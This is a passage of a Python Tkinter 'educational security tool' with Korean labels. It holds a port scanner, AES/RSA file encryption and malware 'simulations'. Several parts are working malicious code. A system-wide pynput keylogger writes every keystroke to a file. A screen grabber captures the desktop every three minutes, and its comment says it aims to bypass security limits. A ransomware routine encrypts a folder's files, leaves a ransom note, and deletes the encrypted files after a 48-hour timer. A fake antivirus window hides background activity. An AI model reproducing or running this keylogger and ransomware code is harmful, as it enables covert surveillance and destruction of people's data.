        ttk.Button(threat_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.threat_log_dir_path)).grid(row=1, column=2, padx=5)
        
        ttk.Separator(threat_frame, orient='horizontal').grid(row=2, column=0, columnspan=3, sticky='ew', pady=10)
        
        # 1. 웜 바이러스 체험 (자기 복제 시뮬레이션)
        ttk.Label(threat_frame, text="1. 웜 바이러스 (자기 복제)", font=('Malgun Gothic', 10, 'bold')).grid(row=3, column=0, columnspan=3, pady=(5, 5), sticky='w')
        ttk.Label(threat_frame, text="선택 폴더 내에 시뮬레이션 파일(.log)을 복제합니다.").grid(row=4, column=0, columnspan=3, sticky='w')
        
        ttk.Label(threat_frame, text="복제 대상 폴더:").grid(row=5, column=0, pady=7, padx=(0, 10), sticky='w')
        self.worm_dir_path = ttk.Entry(threat_frame, width=35); self.worm_dir_path.grid(row=5, column=1, pady=7, padx=5, sticky='ew')
        ttk.Button(threat_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.worm_dir_path)).grid(row=5, column=2, padx=5)

        ttk.Button(threat_frame, text="💥 웜 복제 시뮬레이션 시작", style='Encrypt.TButton', command=self.execute_worm_thread).grid(row=6, column=0, pady=(5, 15), columnspan=3, sticky='ew', padx=5)
        
        ttk.Separator(threat_frame, orient='horizontal').grid(row=7, column=0, columnspan=3, sticky='ew', pady=10)

        # 2. 스파이웨어/키로거 체험 (실제 키 로깅 & 캡처)
        ttk.Label(threat_frame, text="2. 스파이웨어/키로거 (실제 키 로깅 & 캡처)", font=('Malgun Gothic', 10, 'bold')).grid(row=8, column=0, columnspan=3, pady=(5, 5), sticky='w')
        
        ttk.Label(threat_frame, text="캡처/로그 저장 폴더:").grid(row=9, column=0, pady=7, padx=(0, 10), sticky='w')
        self.spy_log_dir_path = ttk.Entry(threat_frame, width=35); self.spy_log_dir_path.grid(row=9, column=1, pady=7, padx=5, sticky='ew')
        self.spy_log_dir_path.insert(0, str(default_threat_dir)) # 기본값 설정
        ttk.Button(threat_frame, text="📁 폴더 선택", command=lambda: self.browse_directory(self.spy_log_dir_path)).grid(row=9, column=2, padx=5)

        ttk.Label(threat_frame, text=f"실시간 키 입력이 '{SPY_LOG_NAME}'에 기록되고, 바탕화면이 캡처됩니다.", foreground='#D32F2F').grid(row=10, column=0, columnspan=3, sticky='w')
        
        self.spyware_button = ttk.Button(threat_frame, text="🕵️ 스파이웨어/키로거 시뮬레이션 시작", style='Scan.TButton', command=self.toggle_spyware_thread)
        self.spyware_button.grid(row=11, column=0, pady=(5, 15), columnspan=3, sticky='ew', padx=5)
        
        ttk.Separator(threat_frame, orient='horizontal').grid(row=12, column=0, columnspan=3, sticky='ew', pady=10)

        # 3. 트로이 목마 체험 (은닉 실행 시뮬레이션)
        ttk.Label(threat_frame, text="3. 트로이 목마 (은닉 실행)", font=('Malgun Gothic', 10, 'bold')).grid(row=13, column=0, columnspan=3, pady=(5, 5), sticky='w')
        ttk.Label(threat_frame, text="겉으로는 백신 검사처럼 보이지만, 백그라운드에서 상세 로그를 생성합니다.", foreground='#388E3C').grid(row=14, column=0, columnspan=3, sticky='w')

        ttk.Button(threat_frame, text="🐴 트로이 목마 시뮬레이션 실행 (백신 검사)", style='Decrypt.TButton', command=self.execute_trojan_thread).grid(row=15, column=0, pady=(5, 5), columnspan=3, sticky='ew', padx=5)
        
        # --- 상태 표시 위젯 ---
        self.threat_status_var = tk.StringVar(value="📢 위협 요소 체험 준비 완료.") 
        ttk.Label(threat_frame, textvariable=self.threat_status_var, font=('Malgun Gothic', 10, 'italic')).grid(row=16, column=0, columnspan=3, pady=(15, 5), sticky='w')


    # --- 6. 개발자 정보 탭 ---
    def create_developer_tab(self):
        dev_frame = ttk.Frame(self.notebook, padding="15")
        self.notebook.add(dev_frame, text="👨‍💻 개발자 정보")
        
        info = [
          ("프로그램 이름:", "파이썬 통합 보안 도구 (교육용)"),
          ("버전:", "V3.0 (2025년 11월)"),
          ("사용 언어:", "Python 3 + Tkinter"),
          ("핵심 라이브러리:", "cryptography, socket, threading, Pillow, pynput"),
          ("제작 목적:", "암호화, 스캐닝 및 악성코드 동작 학습"),
          ("주의 사항:", f"1:RSA 키는 지정된 경로에 저장됩니다.\n2:절대로 이 프로그램을 악용하여 입힌 피해는 제 책임이 아닌 자기 자신의 책임을 알아주십시오") 
    ]

        for i, (label, value, *color) in enumerate(info):
            ttk.Label(dev_frame, text=label, font=('Malgun Gothic', 10, 'bold')).grid(row=i, column=0, sticky='w', pady=5, padx=(0, 10))
            val_label = ttk.Label(dev_frame, text=value, font=('Malgun Gothic', 10))
            if color:
                val_label.configure(foreground=color[0])
            val_label.grid(row=i, column=1, sticky='w', pady=5)


    # ----------------------------------------------------------------------
    # C. 기능 실행 메서드 
    # ----------------------------------------------------------------------
    
    # --- 포트 스캐너 ---
    def execute_scan_thread(self):
        """포트 스캔을 새 스레드에서 시작"""
        ip = self.target_ip_entry.get()
        try:
            start_port = int(self.start_port_entry.get())
            end_port = int(self.end_port_entry.get())
            if not ip or not (0 < start_port <= 65535) or not (0 < end_port <= 65535) or start_port > end_port:
                raise ValueError
        except ValueError:
            messagebox.showerror("오류", "유효한 IP 주소 및 포트 범위를 입력하세요 (1-65535).")
            return

        self.result_text.config(state='normal')
        self.result_text.delete(1.0, tk.END)
        self.result_text.config(state='disabled')
        
        self.scan_progress_var.set(0)
        self.scan_status_var.set("📢 스캔 시작...")
        
        threading.Thread(target=self._run_port_scan, args=(ip, start_port, end_port)).start()

    def _run_port_scan(self, ip, start_port, end_port):
        """실제 포트 스캔 로직"""
        open_ports = []
        total_ports = end_port - start_port + 1
        
        def scan_port(port):
            """단일 포트 스캔 시도"""
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.0)
                result = s.connect_ex((ip, port))
                s.close()
                if result == 0:
                    open_ports.append(port)
                    self.master.after(0, self._update_scan_result, f"✅ 포트 열림: {port}\n")
            except Exception:
                pass

        threads = []
        for port in range(start_port, end_port + 1):
            t = threading.Thread(target=scan_port, args=(port,))
            threads.append(t)
            t.start()
            
            # 진행률 업데이트 로직 (간소화)
            progress = int(((port - start_port + 1) / total_ports) * 100)
            self.master.after(0, self.scan_progress_var.set, progress)
            self.master.after(0, self.scan_status_var.set, f"🔍 {ip} 스캔 중... ({port}/{end_port})")

        for t in threads:
            t.join()

        final_message = f"스캔 완료. 열린 포트: {len(open_ports)}개"
        self.master.after(0, self.scan_status_var.set, final_message)
        self.master.after(0, self.scan_progress_var.set, 100)
        
        if not open_ports:
            self.master.after(0, self._update_scan_result, "❌ 열린 포트가 발견되지 않았습니다.\n")
        
        self.master.after(0, self._update_scan_result, f"\n--- {final_message} ---\n")
        
        self.master.after(0, self.scan_progress_var.set, 0)
        self.master.after(0, self.scan_status_var.set, "✅ 스캔 작업 준비 완료.") 

    def _update_scan_result(self, text):
        """텍스트 위젯에 스캔 결과를 안전하게 추가"""
        self.result_text.config(state='normal')
        self.result_text.insert(tk.END, text)
        self.result_text.see(tk.END)
        self.result_text.config(state='disabled')

    # --- AES 암호화/복호화 ---
    def execute_aes_encrypt_thread(self):
        filepath = self.aes_file_path.get()
        if not os.path.exists(filepath): messagebox.showerror("오류", "파일 경로가 유효하지 않습니다."); return
        self.aes_progress_var.set(0)
        self.aes_status_var.set("📢 암호화 시작...")
        threading.Thread(target=self._run_aes_encrypt, args=(filepath, self.aes_key_base_dir)).start()

    def _run_aes_encrypt(self, filepath, key_base_dir):
        try:
            aes_encrypt_file_chunked(
                filepath, 
                key_base_dir,
                lambda p, m: self.update_progress(self.aes_progress_var, self.aes_status_var, p, m)
            )
            self.master.after(0, messagebox.showinfo, "성공", f"파일 암호화 완료: {pathlib.Path(filepath).name + AES_EXT}")
        except Exception as e:
            self.master.after(0, messagebox.showerror, "오류", f"AES 암호화 실패: {e}")
        finally:
            self.master.after(0, self.aes_progress_var.set, 0)
            self.master.after(0, self.aes_status_var.set, "✅ AES 작업 준비 완료.")
    
    def execute_aes_decrypt_thread(self):
        encrypted_filepath = self.aes_file_path.get()
        if not os.path.exists(encrypted_filepath) or not encrypted_filepath.endswith(AES_EXT): 
            messagebox.showerror("오류", f"유효한 암호화 파일 경로가 아닙니다. ({AES_EXT} 확장자 확인)")
            return
        self.aes_progress_var.set(0)
        self.aes_status_var.set("📢 복호화 시작...")
        threading.Thread(target=self._run_aes_decrypt, args=(encrypted_filepath, self.aes_key_base_dir)).start()

    def _run_aes_decrypt(self, encrypted_filepath, key_base_dir):
        try:
            aes_decrypt_file_chunked(
                encrypted_filepath, 
                key_base_dir,
                lambda p, m: self.update_progress(self.aes_progress_var, self.aes_status_var, p, m)
            )
            self.master.after(0, messagebox.showinfo, "성공", f"파일 복호화 완료: {pathlib.Path(encrypted_filepath).name.replace(AES_EXT, '')}")
        except Exception as e:
            self.master.after(0, messagebox.showerror, "오류", f"AES 복호화 실패: {e}")
        finally:
            self.master.after(0, self.aes_progress_var.set, 0)
            self.master.after(0, self.aes_status_var.set, "✅ AES 작업 준비 완료.")


    # --- RSA 키 관리 및 암호화/복호화 ---
    def execute_rsa_key_pair_thread(self):
        """RSA 키 쌍 생성 스레드 시작"""
        self.rsa_progress_var.set(0)
        self.rsa_status_var.set("📢 RSA 키 쌍 생성 시작...")
        threading.Thread(target=self._run_rsa_key_pair).start()

    def _run_rsa_key_pair(self):
        """실제 RSA 키 쌍 생성 로직"""
        try:
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=4096,
                backend=default_backend()
            )
            public_key = private_key.public_key()

            # 개인키 저장
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            with open(self.key_base_dir / "private.pem", "wb") as f:
                f.write(private_pem)

            # 공개키 저장
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            with open(self.key_base_dir / "public.pem", "wb") as f:
                f.write(public_pem)
                
            self.master.after(0, self.rsa_progress_var.set, 100)
            self.master.after(0, messagebox.showinfo, "성공", f"RSA 4096bit 키 쌍이 '{self.key_base_dir}'에 생성되었습니다.")
        except Exception as e:
            self.master.after(0, messagebox.showerror, "오류", f"RSA 키 생성 실패: {e}")
        finally:
            self.master.after(0, self.rsa_progress_var.set, 0)
            self.master.after(0, self.rsa_status_var.set, "✅ RSA 작업 준비 완료.")
    
    def execute_rsa_encrypt_thread(self):
        filepath = self.rsa_file_path.get()
        if not os.path.exists(filepath): messagebox.showerror("오류", "파일 경로가 유효하지 않습니다."); return
        self.rsa_progress_var.set(0)
        self.rsa_status_var.set("📢 암호화 시작...")
        threading.Thread(target=self._run_rsa_encrypt, args=(filepath,)).start()

    def _run_rsa_encrypt(self, filepath):
        try:
            public_key = load_public_key(self.key_base_dir)
            hybrid_encrypt_file_chunked(
                filepath, 
                public_key,
                lambda p, m: self.update_progress(self.rsa_progress_var, self.rsa_status_var, p, m)
            )
            self.master.after(0, messagebox.showinfo, "성공", f"RSA 하이브리드 암호화 완료: {pathlib.Path(filepath).name + HYB_EXT}")
        except Exception as e:
            self.master.after(0, messagebox.showerror, "오류", f"RSA 암호화 실패: {e}")
        finally:
            self.master.after(0, self.rsa_progress_var.set, 0)
            self.master.after(0, self.rsa_status_var.set, "✅ RSA 작업 준비 완료.")

    def execute_rsa_decrypt_thread(self):
        encrypted_filepath = self.rsa_file_path.get()
        if not os.path.exists(encrypted_filepath) or not encrypted_filepath.endswith(HYB_EXT): 
            messagebox.showerror("오류", f"유효한 암호화 파일 경로가 아닙니다. ({HYB_EXT} 확장자 확인)")
            return
        self.rsa_progress_var.set(0)
        self.rsa_status_var.set("📢 복호화 시작...")
        threading.Thread(target=self._run_rsa_decrypt, args=(encrypted_filepath,)).start()

    def _run_rsa_decrypt(self, encrypted_filepath):
        try:
            private_key = load_private_key(self.key_base_dir)
            hybrid_decrypt_file_chunked(
                encrypted_filepath, 
                private_key,
                lambda p, m: self.update_progress(self.rsa_progress_var, self.rsa_status_var, p, m)
            )
            self.master.after(0, messagebox.showinfo, "성공", f"RSA 하이브리드 복호화 완료: {pathlib.Path(encrypted_filepath).name.replace(HYB_EXT, '')}")
        except Exception as e:
            self.master.after(0, messagebox.showerror, "오류", f"RSA 복호화 실패: {e}")
        finally:
            self.master.after(0, self.rsa_progress_var.set, 0)
            self.master.after(0, self.rsa_status_var.set, "✅ RSA 작업 준비 완료.")
            
    # ----------------------------------------------------------------------
    # D. 랜섬웨어 타이머 및 삭제 로직 
    # ----------------------------------------------------------------------
    
    def _start_ransom_timer(self):
        """카운트다운 타이머를 시작합니다."""
        if self.ransom_timer_running:
            self._stop_ransom_timer(message="📢 기존 타이머 중지")

        self.ransom_timer_running = True
        self.ransom_time_left = SIMULATION_DEADLINE_SECONDS # 초기 시간 설정
        self.ransom_deadline_label.config(foreground='#D32F2F') # 빨간색
        self.ransom_status_var.set(f"🚨 48시간 타이머 시작됨! (실제 48시간)")
        self._update_ransom_timer() # 즉시 업데이트 시작


    def _update_ransom_timer(self):
        """타이머를 갱신하고 남은 시간을 표시하며, 0이 되면 삭제를 실행합니다."""
        if not self.ransom_timer_running:
            return

        # 시간, 분, 초 계산
        time_left = self.ransom_time_left
        hours = time_left // 3600
        mins = (time_left % 3600) // 60
        secs = time_left % 60
        
        self.ransom_deadline_var.set(f"남은 시간: {hours:02d}:{mins:02d}:{secs:02d}")
        
        if self.ransom_time_left <= 0:
            self._permanent_delete_simulation()
            self._stop_ransom_timer(message="⏰ 타이머 종료, 파일 영구 삭제 시뮬레이션 완료")
            return

        # 1시간(3600초) 미만일 때 깜빡임 효과 및 경고색
        if self.ransom_time_left <= 3600 and self.ransom_time_left % 2 == 0: 
            self.ransom_deadline_label.config(foreground='#FF0000' if self.ransom_time_left % 4 == 0 else '#800000')

        self.ransom_time_left -= 1
        # 1초마다 반복 (1000ms)
        self.ransom_timer_id = self.master.after(1000, self._update_ransom_timer) 

    def _stop_ransom_timer(self, message="📢 타이머 중지됨 (복호화 성공)"):
        """타이머를 중지하고 상태를 업데이트합니다."""
        if self.ransom_timer_id:
            self.master.after_cancel(self.ransom_timer_id)
            self.ransom_timer_id = None
        
        self.ransom_timer_running = False
        self.ransom_time_left = SIMULATION_DEADLINE_SECONDS
        self.ransom_deadline_var.set("타이머: 48시간")
        self.ransom_deadline_label.config(foreground='#5D4037')
        self.ransom_status_var.set(message)
        
    def _permanent_delete_simulation(self):
        """
        타이머 만료 시 파일을 영구 삭제하는 시뮬레이션입니다.
        암호화된 파일을 실제 파일 시스템에서 삭제합니다.
        """
        target_dir = self.ransom_dir_path.get()
        if not os.path.isdir(target_dir):
            return

        # 암호화된 파일(.hyb_enc) 목록을 찾아서 삭제
        files_to_delete = [p for p in pathlib.Path(target_dir).rglob(f'*{HYB_EXT}') if p.is_file()]
        
        for filepath in files_to_delete:
            try:
                os.remove(filepath)
            except Exception:
                pass # 삭제 실패 무시

        # 랜섬 노트 삭제
        ransom_note_path = pathlib.Path(target_dir) / RANSOM_NOTE_NAME
        if ransom_note_path.exists():
            os.remove(ransom_note_path)

        self.master.after(0, messagebox.showwarning, "🚨 파일 영구 삭제됨", 
                         f"48시간이 경과하여 {len(files_to_delete)}개의 암호화된 파일이 영구적으로 삭제되었습니다. 복호화는 불가능합니다.")


    # --- 랜섬웨어 체험 실행 메서드 ---
    def execute_ransom_encrypt_thread(self):
        target_dir = self.ransom_dir_path.get()
        if not os.path.isdir(target_dir): 
            messagebox.showerror("오류", "유효한 대상 폴더 경로가 아닙니다."); return
        self.ransom_progress_var.set(0)
        self.ransom_status_var.set("📢 랜섬웨어 암호화 시작...")
        threading.Thread(target=self._run_ransom_encrypt, args=(target_dir,)).start()

    def _run_ransom_encrypt(self, target_dir):
        try:
            public_key = load_public_key(self.key_base_dir)
            
            files = [p for p in pathlib.Path(target_dir).rglob('*') if p.suffix.lower() in RANSOM_EXTS and p.is_file()]
            if not files:
                self.master.after(0, messagebox.showwarning, "경고", "암호화할 대상 파일이 없습니다.")
                return

            total_files = len(files)
            for i, filepath in enumerate(files):
                self.update_progress(self.ransom_progress_var, self.ransom_status_var, 
                                     int(((i + 1) / total_files) * 100), 
                                     f"🔥 ({i+1}/{total_files}) 암호화 중: {filepath.name}")
                
                # 파일별 개별 진행률 콜백 (간소화)
                def progress_cb(p, m): pass 
                
                hybrid_encrypt_file_chunked(str(filepath), public_key, progress_cb)
            
            # 랜섬 노트 생성
            ransom_note_path = pathlib.Path(target_dir) / RANSOM_NOTE_NAME
            with open(ransom_note_path, 'w', encoding='utf-8') as f:
                f.write(RANSOM_NOTE_CONTENT)

            self.master.after(0, messagebox.showinfo, "성공", f"랜섬웨어 시뮬레이션 완료. {total_files}개 파일 암호화 및 랜섬 노트 생성 완료.")
            
            # 타이머 시작
            self.master.after(0, self._start_ransom_timer)
            
        except Exception as e:
            self.master.after(0, messagebox.showerror, "오류", f"랜섬웨어 암호화 실패: {e}")
        finally:
            self.master.after(0, self.ransom_progress_var.set, 0)
            self.master.after(0, self.ransom_status_var.set, "🚨 랜섬웨어 체험 대기 (48시간 타이머 상태 확인).") 
            
    def execute_ransom_decrypt_thread(self):
        target_dir = self.ransom_dir_path.get()
        if not os.path.isdir(target_dir): 
            messagebox.showerror("오류", "유효한 대상 폴더 경로가 아닙니다."); return
        self.ransom_progress_var.set(0)
        self.ransom_status_var.set("📢 랜섬웨어 복호화 시작...")
        threading.Thread(target=self._run_ransom_decrypt, args=(target_dir,)).start()

    def _run_ransom_decrypt(self, target_dir):
        try:
            private_key = load_private_key(self.key_base_dir)
            
            files = [p for p in pathlib.Path(target_dir).rglob('*') if p.suffix.lower() == HYB_EXT and p.is_file()]
            if not files:
                self.master.after(0, messagebox.showwarning, "경고", "복호화할 암호화된 파일이 없습니다.")
                return

            total_files = len(files)
            for i, filepath in enumerate(files):
                self.update_progress(self.ransom_progress_var, self.ransom_status_var, 
                                     int(((i + 1) / total_files) * 100), 
                                     f"🔑 ({i+1}/{total_files}) 복호화 중: {filepath.name}")
                
                def progress_cb(p, m): pass
                
                hybrid_decrypt_file_chunked(str(filepath), private_key, progress_cb)
                
            # 랜섬 노트 삭제
            ransom_note_path = pathlib.Path(target_dir) / RANSOM_NOTE_NAME
            if ransom_note_path.exists():
                os.remove(ransom_note_path)

            self.master.after(0, messagebox.showinfo, "성공", f"랜섬웨어 복구 시뮬레이션 완료. {total_files}개 파일 복호화 및 랜섬 노트 삭제 완료.")
            
            # 타이머 중지
            self.master.after(0, self._stop_ransom_timer)
            
        except Exception as e:
            self.master.after(0, messagebox.showerror, "오류", f"랜섬웨어 복호화 실패: {e}")
        finally:
            self.master.after(0, self.ransom_progress_var.set, 0)
            self.master.after(0, self.ransom_status_var.set, "🚨 랜섬웨어 체험 대기 (48시간 타이머 상태 확인).")
            
    
    # ----------------------------------------------------------------------
    # E. 위협 요소 체험 메서드 
    # ----------------------------------------------------------------------

    # 1. 웜 바이러스 체험
    def execute_worm_thread(self):
        target_dir = self.worm_dir_path.get()
        if not os.path.isdir(target_dir): 
            messagebox.showerror("오류", "유효한 복제 대상 폴더 경로가 아닙니다."); return
        self.threat_status_var.set("📢 웜 복제 시작...")
        threading.Thread(target=self._worm_simulation, args=(target_dir,)).start()
        
    def _worm_simulation(self, target_dir):
        try:
            target_path = pathlib.Path(target_dir) / WORM_FILE_NAME
            
            # 최초 파일 생성
            if not target_path.exists():
                with open(target_path, 'w', encoding='utf-8') as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 웜 시뮬레이션 파일 생성\n")
            
            # 자기 복제 (10회 시뮬레이션)
            for i in range(1, 11):
                clone_name = f"clone_{i}_{WORM_FILE_NAME}"
                clone_path = pathlib.Path(target_dir) / clone_name
                shutil.copy(target_path, clone_path)
                with open(target_path, 'a', encoding='utf-8') as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 복제 파일 생성: {clone_name}\n")
                self.master.after(0, self.threat_status_var.set, f"💥 웜 복제 중... ({i}/10) {clone_name} 생성")
                time.sleep(0.5) 
                
            self.master.after(0, messagebox.showinfo, "성공", f"웜 시뮬레이션 완료. 총 10개 파일이 '{target_dir}'에 복제되었습니다.")
        except Exception as e:
            self.master.after(0, messagebox.showerror, "오류", f"웜 시뮬레이션 실패: {e}")
        finally:
            # 상태 리셋
            self.master.after(0, self.threat_status_var.set, "📢 위협 요소 체험 준비 완료.")


    # 2. 스파이웨어/키로거 체험 (키보드 피드백 기능 추가)
    def _update_keylogger_feedback(self, new_char):
        """키 입력 버퍼를 갱신하고 상태 바에 표시합니다."""
        
        # 특수키 처리
        if new_char.startswith('['):
            self.key_buffer.append(new_char)
        else:
            self.key_buffer.append(new_char)

        # 버퍼 크기 제한 (최근 30개 문자만 표시)
        self.key_buffer = self.key_buffer[-30:]

        # 표시용 텍스트 정리
        display_text = "".join(self.key_buffer)
        display_text = display_text.replace('[space]', '_')
        display_text = display_text.replace('[enter]', '↩')
        display_text = display_text.replace('[shift]', '')
        display_text = display_text.replace('[ctrl]', '')
        display_text = display_text.replace('[alt]', '')
        display_text = display_text.replace('[delete]', '✂')
        display_text = display_text.replace('[backspace]', '⌫')
        
        self.threat_status_var.set(f"🕵️ 현재 입력: {display_text}")

    def toggle_spyware_thread(self):
        if self.is_key_logging:
            # 중지
            self._stop_key_logging()
            self.spyware_button.config(text="🕵️ 스파이웨어/키로거 시뮬레이션 시작", style='Scan.TButton')
        else:
            # 시작
            target_dir = self.spy_log_dir_path.get()
            try:
                pathlib.Path(target_dir).mkdir(parents=True, exist_ok=True)
            except Exception as e:
                messagebox.showerror("오류", f"로그/캡처 저장 폴더 생성 실패: {e}"); return
            
            self.spyware_button.config(text="🛑 스파이웨어/키로거 중지", style='Decrypt.TButton')
            self.threat_status_var.set("📢 키로거/스파이웨어 시작됨. 키 입력과 캡처를 기록 중...")
            threading.Thread(target=self._start_key_logging, args=(target_dir,)).start()
            threading.Thread(target=self._start_screen_capture, args=(target_dir,)).start() # 캡처 스레드 시작
            self.is_key_logging = True

    def _start_key_logging(self, log_dir):
        """키보드 리스너를 시작하고 로그 파일에 기록"""
        log_path = pathlib.Path(log_dir) / SPY_LOG_NAME
        
        def on_press(key):
            try:
                key_char = key.char
            except AttributeError:
                key_char = f'[{key.name}]'
            
            # 로그 기록
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(f"[{time.strftime('%H:%M:%S')}] {key_char}\n")
                
            # GUI 상태 업데이트 (메인 스레드에서 실행)
            self.master.after(0, self._update_keylogger_feedback, key_char)

        def on_release(key):
            if key == keyboard.Key.esc or not self.is_key_logging: # ESC를 누르거나 GUI에서 중지하면 종료
                return False

        try:
            self.key_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
            self.key_listener.start()
            self.key_listener.join()
        except Exception as e:
            if self.is_key_logging: # 사용자가 중지한 경우가 아니라면 에러 보고
                self.master.after(0, messagebox.showerror, "키로거 오류", f"키 로깅 중 오류 발생: {e}")
                self.master.after(0, self.toggle_spyware_thread) # 버튼 상태 리셋
                
    def _stop_key_logging(self):
        """키보드 리스너를 안전하게 중지 (상태 리셋 추가)"""
        self.is_key_logging = False
        if self.key_listener:
            self.key_listener.stop()
            self.key_listener = None
        self.key_buffer = [] # 버퍼 초기화
        # 상태 리셋
        self.master.after(0, self.threat_status_var.set, "📢 위협 요소 체험 준비 완료.")

    def _start_screen_capture(self, log_dir):
        """
        [mss 라이브러리로 변경됨] 일정 시간 간격으로 화면 캡처 및 저장
        ImageGrab보다 OS에 직접 접근하여 보안 제한 우회 시도
        """
        with mss.mss() as sct:
            while self.is_key_logging:
                try:
                    capture_path = pathlib.Path(log_dir) / f"{CAPTURE_NAME}{time.strftime('%Y%m%d_%H%M%S')}.png"
                    
                    # 캡처할 모니터 정보 (1은 주 모니터를 의미)
                    monitor = sct.monitors[1] 
                    sct_img = sct.grab(monitor)
                    
                    # mss의 to_png 도구를 사용하여 PNG 파일로 저장
                    mss.tools.to_png(sct_img.rgb, sct_img.size, output=str(capture_path))
                    
                    log_path = pathlib.Path(log_dir) / SPY_LOG_NAME
                    with open(log_path, 'a', encoding='utf-8') as f:
                        f.write(f"[{time.strftime('%H:%M:%S')}] 화면 캡처 완료(mss): {capture_path.name}\n")
                        
                    self.master.after(0, self.threat_status_var.set, f"🕵️ 캡처 및 키 로깅 중... 마지막 캡처: {capture_path.name}")
                    
                    # 3분(180초) 대기 
                    time.sleep(180) 
                    
                except Exception as e:
                    # 캡처 실패 시 (권한, 리소스 등 문제)
                    print(f"MSS 캡처 실패 오류: {e}") # << 오류 메시지를 출력하여 진단
                    
                    log_path = pathlib.Path(log_dir) / SPY_LOG_NAME
                    try:
                        with open(log_path, 'a', encoding='utf-8') as f:
                            f.write(f"[{time.strftime('%H:%M:%S')}] 캡처 실패 오류: {e}\n")
                    except:
                        pass # 로그 파일 접근 오류는 무시

                    time.sleep(5)
                    continue
                    
        # 상태 리셋
        self.master.after(0, self.threat_status_var.set, "📢 위협 요소 체험 준비 완료.")


    # 3. 트로이 목마 체험
    def execute_trojan_thread(self):
        target_dir = self.threat_log_dir_path.get()
        try:
            pathlib.Path(target_dir).mkdir(parents=True, exist_ok=True)
        except Exception as e:
            messagebox.showerror("오류", f"로그 저장 폴더 생성 실패: {e}"); return
        
        self.threat_status_var.set("📢 트로이 목마 실행됨 (백그라운드에서 로그 생성 시작)...")
        # 가짜 스캐너 GUI를 띄우는 스레드 시작
        threading.Thread(target=self._run_fake_scanner, args=(target_dir,)).start()


    def _run_fake_scanner(self, log_dir):
        """가짜 백신 스캐너 GUI를 띄우고 백그라운드에서 악성 로직 실행"""
        
        # --- 가짜 스캐너 창 생성 ---
        scanner_window = tk.Toplevel(self.master)
        scanner_window.title("🛡️ 안전 검사 및 최적화 중...")
        scanner_window.geometry("400x150")
        scanner_window.resizable(False, False)
        
        ttk.Label(scanner_window, text="시스템 보안 검사 중...", font=('Malgun Gothic', 12, 'bold')).pack(pady=(10, 5))
        
        # 경로의 \W, \S 이스케이프 경고 방지를 위해 '/' 사용
        scan_file_var = tk.StringVar(value="C:/Windows/System32/explorer.exe 검사 중...") 
        ttk.Label(scanner_window, textvariable=scan_file_var, font=('Consolas', 9)).pack(pady=(0, 10))

        progress_var = tk.DoubleVar()
        progress_bar = ttk.Progressbar(scanner_window, orient="horizontal", length=350, mode="determinate", variable=progress_var)
        progress_bar.pack(pady=5)
        
        # --- 백그라운드 악성 로직 실행 ---
        # 실제 로그 생성 로직을 별도 스레드에서 시작
        log_thread = threading.Thread(target=self._trojan_simulation_logic, args=(log_dir,))
        log_thread.start()
        
        # --- 가짜 스캔 진행 시뮬레이션 (10초 동안) ---
        total_time = 10 
        for i in range(1, total_time * 10): # 0.1초마다 업데이트
            progress = (i / (total_time * 10)) * 100
            scan_file_var.set(f"시스템 파일 검사 중... (폴더: {random.choice(['Users', 'AppData', 'Temp', 'Program Files'])}/file_{i}.dll)")
            progress_var.set(progress)
            self.master.update_idletasks() # Tkinter GUI 업데이트
            time.sleep(0.1)
            if not log_thread.is_alive(): # 로깅이 일찍 끝나면 중단
                break

        # --- 검사 완료 및 창 닫기 ---
        progress_var.set(100)
        scan_file_var.set("✅ 검사 완료! 시스템이 안전합니다.")
        
        # 백그라운드 로깅 스레드가 종료될 때까지 대기
        log_thread.join() 
        
        self.master.after(1000, scanner_window.destroy) # 1초 후 가짜 창 닫기
        self.master.after(1000, messagebox.showinfo, "알림", "시스템 검사 완료. 문제가 발견되지 않았습니다.")
        
        # 상태 리셋
        self.master.after(0, self.threat_status_var.set, "📢 위협 요소 체험 준비 완료.")


    def _trojan_simulation_logic(self, log_dir):
        """
        [상세화됨] 백그라운드에서 은닉된 악성 동작 시뮬레이션 (상세 로그 생성)
        """
        log_path = pathlib.Path(log_dir) / "trojan_activity_log.txt"
        
        try:
            # 1. 초기 정보 기록
            with open(log_path, 'w', encoding='utf-8') as f:
                f.write("================== 트로이 목마 은닉 활동 보고서 ==================\n")
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 실행 시작: 사용자 속임수(백신 검사) 성공.\n")
                f.write("----------------------------------------------------------------\n")
            
            # 2. 1단계: 시스템 정보 수집 (2초)
            time.sleep(2) 
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [1단계] 시스템 정보 수집 완료 (OS 버전, 사용자명, IP 주소).\n")
                f.write(f"    -> 획득 데이터: OS({os.name}) / User({os.getenv('USERNAME')})\n")
            
            # 3. 2단계: 보안 소프트웨어 및 설정 검색 (2초)
            time.sleep(2) 
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [2단계] 보안 환경 검사: 방화벽 및 주요 안티바이러스 설정 파일 검색.\n")
                f.write("    -> 탐지 회피 전략 적용 중...\n")
                
            # 4. 3단계: 로컬 중요 파일 검색 (2초)
            time.sleep(2) 
            with open(log_path, 'a', encoding='utf-8') as f:
                target_files = random.choice(['report.docx', 'passwords.txt', 'photo_archive.zip', 'bank_info.csv'])
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [3단계] 로컬 데이터 스캔: '문서', '다운로드' 폴더에서 중요 파일 검색.\n")
                f.write(f"    -> 발견된 파일 (시뮬레이션): '{target_files}'\n")

            # 5. 4단계: 인증 정보 스캔 및 암호화 준비 (2초)
            time.sleep(2) 
            with open(log_path, 'a', encoding='utf-8') as f:
                credential_type = random.choice(['FTP', 'Browser Cache', 'Email Client'])
